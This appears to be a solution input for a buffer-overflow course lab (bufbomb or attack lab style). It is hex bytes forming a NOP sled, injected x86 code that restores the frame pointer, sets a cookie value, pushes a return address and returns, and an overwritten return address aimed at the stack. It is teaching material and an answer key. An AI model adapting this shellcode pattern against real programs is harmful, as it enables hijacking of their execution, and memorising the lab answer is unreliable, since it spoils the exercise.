90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 90 90 90 90 90 90 90 /* nop */
90 /* nop */
8d 6c 24 18    /* lea    0x18(%esp),%ebp */
b8 84 3e d1 44 /* mov    $0x44d13e84,%eax */
68 fd 8c 04 08 /* push   $0x8048cfd */
c3             /* ret */
32 32 32 32
08 39 68 55    /* code start */
